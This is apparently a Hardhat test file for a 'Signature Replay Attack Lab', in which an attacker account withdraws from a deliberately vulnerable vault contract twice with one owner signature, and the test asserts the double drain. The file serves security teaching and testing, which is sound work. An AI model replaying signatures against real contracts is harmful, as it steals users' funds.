import { expect } from "chai";
import hardhat from "hardhat";
const { ethers } = hardhat;

describe("Signature Replay Attack Lab", function () {

    async function deployFixture() {
        const [owner, attacker] = await ethers.getSigners();

        const Vault = await ethers.getContractFactory("VulnerableSignatureVault");
        const vault = await Vault
            .connect(owner)
            .deploy({ value: ethers.parseEther("5") });

        return { owner, attacker, vault };
    }

    it("allows replaying the same signature to drain funds", async function () {
        const { owner, attacker, vault } = await deployFixture();

        const withdrawAmount = ethers.parseEther("1");

        const messageHash = ethers.keccak256(
            ethers.solidityPacked(
                ["address", "uint256"],
                [attacker.address, withdrawAmount]
            )
        );

        const signature = await owner.signMessage(
            ethers.getBytes(messageHash)
        );

        const vaultStart = await ethers.provider.getBalance(vault.target);
        const attackerStart = await ethers.provider.getBalance(attacker.address);

        console.log("\n--- Replay Attack Debug ---");
        console.log("Vault start balance:", ethers.formatEther(vaultStart));

        await vault.connect(attacker).withdraw(
            withdrawAmount,
            signature
        );

        await vault.connect(attacker).withdraw(
            withdrawAmount,
            signature
        );

        const vaultEnd = await ethers.provider.getBalance(vault.target);
        const attackerEnd = await ethers.provider.getBalance(attacker.address);

        console.log("Vault end balance:", ethers.formatEther(vaultEnd));
        console.log(
            "Attacker gained ETH:",
            ethers.formatEther(attackerEnd - attackerStart)
        );
        console.log("--- End Debug ---\n");

        expect(vaultEnd).to.equal(
            vaultStart - withdrawAmount * 2n
        );

        expect(attackerEnd).to.be.gt(attackerStart);
    });
});